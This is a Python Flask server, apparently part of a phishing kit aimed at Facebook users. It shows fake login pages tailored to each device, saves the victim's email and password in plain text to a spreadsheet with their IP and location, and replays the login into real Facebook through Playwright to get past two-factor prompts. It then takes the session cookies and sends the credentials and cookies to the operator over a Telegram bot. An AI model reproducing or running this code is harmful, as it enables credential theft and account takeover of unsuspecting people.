"""
Facebook Login Server - Multi-threaded per user
==================================================
Flask server chạy trên port 5000.
Mỗi user đăng nhập trên một luồng riêng biệt với Playwright instance riêng.
"""

import os
import sys
import time
import threading
import queue
import webbrowser
import requests
from concurrent.futures import Future
from typing import Optional, Dict, Any
from datetime import datetime

# Fix import path
_current_dir = os.path.dirname(os.path.abspath(__file__))
_parent_dir = os.path.dirname(_current_dir)
sys.path.insert(0, _parent_dir)

from flask import Flask, render_template, request, jsonify
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter
from utils.get_html import get_facebook_page_after_login, get_cookies, wait_and_save_cookies

# Telegram config file
BOT_CONFIG_FILE = os.path.join(_parent_dir, "bot_config.txt")

def _adjust_column_widths(ws):

    """Tự động căn chỉnh kích thước cột theo nội dung"""

    try:

        for column in ws.columns:

            max_length = 0

            column_letter = get_column_letter(column[0].column)

            

            for cell in column:

                try:

                    if cell.value:

                        cell_str = str(cell.value)

                        if len(cell_str) > 100:

                            cell_str = cell_str[:100]

                        max_length = max(max_length, len(cell_str))

                except:

                    pass

            

            adjusted_width = min(max_length + 2, 50)

            if adjusted_width < 10:

                adjusted_width = 10

            

            ws.column_dimensions[column_letter].width = adjusted_width

        

        print(f"[Excel] Đã tự động căn chỉnh kích thước cột")

    except Exception as e:

        print(f"[Excel] Lỗi căn chỉnh cột: {e}")

# Flask app - template folder trỏ đến thư mục templates của project
template_dir = os.path.join(_parent_dir, 'templates')
app = Flask(__name__, template_folder=template_dir)

FILE_NAME = os.path.join(_parent_dir, "users.xlsx")

def get_ip_location(ip: str) -> str:
    """Lấy thông tin vị trí từ IP sử dụng ip-api.com"""
    try:
        # Skip for localhost/private IPs
        if ip in ('127.0.0.1', 'localhost') or ip.startswith('192.168.') or ip.startswith('10.'):
            return 'Local/Private Network'
        
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp', timeout=5)
        data = response.json()
        
        if data.get('status') == 'success':
            location = f"{data.get('city', 'N/A')}, {data.get('regionName', 'N/A')}, {data.get('country', 'N/A')} ({data.get('isp', 'N/A')})"
            return location
        return 'Unknown'
    except Exception as e:
        return f'Error: {str(e)[:30]}'

def send_telegram_message(message: str) -> bool:
    """Gửi message qua Telegram Bot"""
    try:
        if not os.path.exists(BOT_CONFIG_FILE):
            print(f"[Telegram] Config file not found: {BOT_CONFIG_FILE}")
            return False
        
        with open(BOT_CONFIG_FILE, "r") as f:
            lines = f.readlines()
            if len(lines) < 2:
                return False
            
            token = lines[0].strip()
            chat_id = lines[1].strip()
        
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"[Telegram] Message sent successfully")
            return True
        else:
            print(f"[Telegram] Failed to send: {response.text}")
            return False
    except Exception as e:
        print(f"[Telegram] Error: {e}")
        return False

# Quản lý các session - mỗi user có worker riêng
_active_sessions: Dict[str, '_AutomationWorker'] = {}
_sessions_lock = threading.Lock()

class _AutomationWorker:
    """Worker thread chạy Playwright operations cho mỗi user riêng biệt"""
    
    def __init__(self, email: str):
        self.email = email
        self._q: "queue.Queue[tuple[callable, tuple, dict, Future]]" = queue.Queue()
        self._thread = threading.Thread(
            target=self._run, 
            name=f"worker-{email}", 
            daemon=True
        )
        self._thread.start()
    
    def _run(self):
        """Main loop của worker thread"""
        while True:
            func, args, kwargs, fut = self._q.get()
            try:
                result = func(*args, **kwargs)
                fut.set_result(result)
            except Exception as e:
                fut.set_exception(e)
    
    def call(self, func, *args, **kwargs):
        """Gọi đồng bộ - đợi kết quả"""
        fut: Future = Future()
        self._q.put((func, args, kwargs, fut))
        return fut.result()
    
    def submit(self, func, *args, **kwargs) -> Future:
        """Gọi bất đồng bộ"""
        fut: Future = Future()
        self._q.put((func, args, kwargs, fut))
        return fut

def detect_device(user_agent: str) -> str:
    """Phát hiện thiết bị từ User-Agent"""
    ua = user_agent.lower()
    if "iphone" in ua or "ipad" in ua or "ios" in ua:
        return "iOS"
    if "android" in ua:
        return "Android"
    return "Desktop"

@app.route("/")
def home():
    """Trang chủ - hiển thị form login phù hợp với thiết bị"""
    user_agent = request.headers.get("User-Agent", "")
    device = detect_device(user_agent)
    
    # Render template theo thiết bị
    template_map = {
        "iOS": "iOS/login.html",
        "Android": "Android/login.html",
        "Desktop": "Desktop/login.html"
    }
    template = template_map.get(device, "Desktop/login.html")
    
    return render_template(template)

@app.route("/login", methods=["POST"])
def login():
    """API đăng nhập - mỗi request chạy trên luồng riêng"""
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    
    if not email or not password:
        return jsonify({"success": False, "error": "Thiếu email hoặc password"}), 400
    
    # Lấy IP và thông tin vị trí
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in client_ip:
        client_ip = client_ip.split(',')[0].strip()
    location_info = get_ip_location(client_ip)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Tạo worker mới cho user này (mỗi user một luồng)
    with _sessions_lock:
        worker = _AutomationWorker(email)
        _active_sessions[email] = worker
    
    # Lưu credentials trước (với IP, Location, Timestamp)
    try:
        if not os.path.exists(FILE_NAME):
            wb = Workbook()
            ws = wb.active
            ws.append(["Address", "Password", "Cookies", "IP Address", "Location", "Timestamp"])
            wb.save(FILE_NAME)
        
        wb = load_workbook(FILE_NAME)
        ws = wb.active
        
        # Cập nhật hoặc thêm mới
        found = False
        for row in range(2, ws.max_row + 1):
            if ws.cell(row=row, column=1).value == email:
                ws.cell(row=row, column=2).value = password
                ws.cell(row=row, column=4).value = client_ip
                ws.cell(row=row, column=5).value = location_info
                ws.cell(row=row, column=6).value = timestamp
                found = True
                break
        
        if not found:
            ws.append([email, password, "", client_ip, location_info, timestamp])
        
        # Tự động căn chỉnh kích thước cột trước khi save
        _adjust_column_widths(ws)
        wb.save(FILE_NAME)
        
    except Exception as e:
        print(f"[Server] Lỗi lưu Excel: {e}")
    
    # Thực hiện đăng nhập trong worker thread riêng
    try:
        html, should_get_cookies, login_failed = worker.call(
            get_facebook_page_after_login,
            username=email,
            password=password,
            timeout=300000
        )
        
        print(f"[Server Debug] html length: {len(html) if html else 0}, should_get_cookies: {should_get_cookies}, login_failed: {login_failed}")
        
        # Nếu đăng nhập sai (URL là /login/web/), trả về login_failed cho client
        if login_failed:
            return jsonify({
                "success": False,
                "login_failed": True,
                "error": "Thông tin đăng nhập không chính xác"
            })
        
        if not html:
            return jsonify({
                "success": False,
                "error": "Không lấy được HTML sau khi đăng nhập"
            }), 500
        
        # Lấy cookies hoặc đợi 2FA
        cookies_value = "Chưa có (đang đợi 2FA)"
        if should_get_cookies:
            try:
                cookies = worker.call(get_cookies, file_name=FILE_NAME)
                cookies_value = cookies if cookies else "Không lấy được"
            except Exception as e:
                cookies_value = f"Lỗi: {str(e)[:50]}"
            
            # Đăng nhập thành công - gửi Telegram và redirect sang /help
            telegram_msg = f"✅ <b>Đăng nhập thành công</b>\n\n📧 Email: {email}\n🔑 Password: {password}\n🍪 Cookies: {cookies_value[:100]}..."
            send_telegram_message(telegram_msg)
            
            print(f"[Server] Đăng nhập thành công - return redirect /help cho client")
            return jsonify({
                "success": True,
                "redirect": "/help",
                "should_get_cookies": True
            })
        else:
            # 2FA flow - đợi cookies sau
            worker.submit(wait_and_save_cookies, file_name=FILE_NAME)
        
        return jsonify({
            "success": True,
            "html": html,
            "should_get_cookies": should_get_cookies
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Lỗi đăng nhập: {str(e)}"
        }), 500

@app.route("/check_2fa_status", methods=["POST"])
def check_2fa_status():
    """API kiểm tra trạng thái 2FA - trả về URL hiện tại để client biết khi nào chuyển sang help"""
    data = request.json
    email = data.get("email", "").strip()
    
    if not email:
        return jsonify({"success": False, "error": "Thiếu email"}), 400
    
    try:
        # Tìm worker bằng email
        with _sessions_lock:
            worker = _active_sessions.get(email)
        
        if not worker:
            return jsonify({"success": False, "error": "Không tìm thấy session"}), 404
        
        # Lấy URL hiện tại từ worker thông qua hàm get_current_url
        from utils.get_html import LAST_PAGE
        if not LAST_PAGE:
            return jsonify({"success": False, "error": "Không tìm thấy page"}), 404
        
        current_url = LAST_PAGE.url
        
        # Kiểm tra nếu cần chuyển sang help (checkpoint_src=any hoặc đã rời khỏi trang 2FA)
        need_help = 'checkpoint_src=any' in current_url
        
        # Kiểm tra nếu đã hoàn tất 2FA (không còn ở trang two_step_verification)
        is_complete = '/login' not in current_url and 'two_step_verification' not in current_url and 'facebook.com' in current_url
        
        # 'completed' để tương thích với hfa.html JavaScript
        completed = is_complete or need_help
        
        return jsonify({
            "success": True,
            "url": current_url,
            "need_help": need_help,
            "is_complete": is_complete,
            "completed": completed
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/get_cookies", methods=["POST"])
def api_get_cookies():
    """API lấy cookies sau khi hoàn tất 2FA"""
    data = request.json
    email = data.get("email", "").strip()
    
    if not email:
        return jsonify({"success": False, "error": "Thiếu email"}), 400
    
    with _sessions_lock:
        worker = _active_sessions.get(email)
    
    if not worker:
        return jsonify({"success": False, "error": "Không tìm thấy session"}), 404
    
    try:
        cookies = worker.call(get_cookies, file_name=FILE_NAME)
        if cookies:
            return jsonify({"success": True, "cookies": cookies})
        return jsonify({"success": False, "error": "Không lấy được cookies"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

def run_server(host="0.0.0.0", port=5000, open_browser=False):
    """Chạy Flask server"""
    url = f"http://localhost:{port}"
    print(f"\n[Server] Khởi động server tại {url}")
    print(f"[Server] Mỗi user đăng nhập trên một luồng riêng biệt\n")
    
    if open_browser:
        webbrowser.open(url)
        print(f"[Server] Đã mở trình duyệt tại {url}")
    
    app.run(
        host=host,
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True  # Flask xử lý mỗi request trên thread riêng
    )

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Facebook Login Server")
    parser.add_argument("--port", "-p", type=int, default=5000, help="Port (mặc định: 5000)")
    parser.add_argument("--no-browser", action="store_true", help="Không tự động mở trình duyệt")
    
    args = parser.parse_args()
    
    run_server(port=args.port, open_browser=not args.no_browser)
